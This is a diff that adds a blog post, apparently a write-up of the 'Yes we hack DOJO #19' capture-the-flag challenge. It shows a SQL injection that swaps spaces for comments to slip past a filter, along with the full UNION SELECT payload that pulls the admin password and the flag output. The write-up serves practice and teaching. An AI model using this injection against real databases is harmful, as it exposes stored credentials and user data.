@@ -1,0 +1,59 @@
+---
+layout: post
+title:  "Yes we hack DOJO #19"
+date:   2022-12-07 10:02:59 +0100
+categories: jekyll update
+---
+
+![](/assets/storytime.png)
+So we can't do -- comments and no spaces.
+Hm.
+
+How about comments?
+
+We have a comment below which is a hint? It also has a \*/ for us
+
+```sql
+SELECT username FROM users WHERE ( role = 'USER' AND email LIKE '%@yahoo.com' ) AND ( id > 13.37 AND id <= 3)/* ) LIMIT 0 -- 10
+/**
+* Set "LIMIT" to 10 when in production
+*/
+```
+
+Are comments valid token delimiters? Yes they are!
+
+So something like 
+```sql
+3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/*
+```
+should work and indeed it does.
+Complete payload is:
+
+```sql
+3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/*
+```
+
+Giving us:
+```sql
+SELECT username FROM users WHERE ( role = 'USER' AND email LIKE '%@yahoo.com' ) AND ( id > 13.37 AND id <= 3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/* ) LIMIT 0 -- 10
+/**
+* Set "LIMIT" to 10 when in production
+*/
+```
+
+```json
+[
+  {
+    "username": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
+  },
+  {
+    "username": "murphygary@gmail.com"
+  }
+]
+```
+
+Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
+
+[jekyll-docs]: https://jekyllrb.com/docs/home
+[jekyll-gh]:   https://github.com/jekyll/jekyll
+[jekyll-talk]: https://talk.jekyllrb.com/
